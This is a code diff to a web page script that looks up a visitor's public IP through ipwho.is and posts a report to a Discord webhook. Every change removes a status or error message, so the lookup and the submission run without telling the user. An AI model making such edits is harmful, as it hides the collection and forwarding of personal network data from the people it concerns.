@@ -81,7 +81,7 @@ async function loadInfo() {
     report = null;
     results.replaceChildren();
     addItem("Status", "Loading...");
-    lookupStatus.textContent = "Retrieving public IP information...";
+    lookupStatus.textContent = "";
 
     try {
         const response = await fetch("https://ipwho.is/", {
@@ -132,8 +132,7 @@ async function loadInfo() {
         results.replaceChildren();
         addItem("Status", "Lookup failed");
 
-        lookupStatus.textContent =
-            "Could not retrieve IP information. Check your connection.";
+        
     }
 }
 
@@ -142,7 +141,7 @@ async function SUND() {
 
     sending = true;
     sendButton.disabled = true;
-    submitStatus.textContent = "Submitting report...";
+    submitStatus.textContent = "";
 
     const payload = {
         username: "IP Information Reports",
@@ -174,10 +173,9 @@ async function SUND() {
             throw new Error("Discord returned HTTP " + response.status);
         }
 
-        submitStatus.textContent = "Report submitted successfully.";
+        
     } catch (error) {
-        submitStatus.textContent =
-            "Submission failed. Check the webhook URL, network access, and Discord configuration.";
+        
     } finally {
         sending = false;
         sendButton.disabled = false;
